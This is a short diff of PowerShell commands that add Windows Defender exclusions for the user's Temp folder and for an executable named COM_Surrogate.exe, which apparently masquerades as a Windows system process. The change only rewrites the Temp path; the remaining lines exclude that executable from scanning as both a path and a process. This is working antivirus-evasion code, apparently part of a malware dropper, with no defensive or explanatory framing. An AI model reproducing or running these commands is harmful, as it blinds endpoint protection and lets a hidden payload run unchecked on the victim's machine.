@@ -1,4 +1,4 @@
-Add-MpPreference -ExclusionPath "$env:temp"
+Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp"
 Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp\COM_Surrogate.exe"
 Add-MpPreference -ExclusionPath $env:TEMP\COM_Surrogate.exe
 Add-MpPreference -ExclusionProcess "COM_Surrogate.exe"
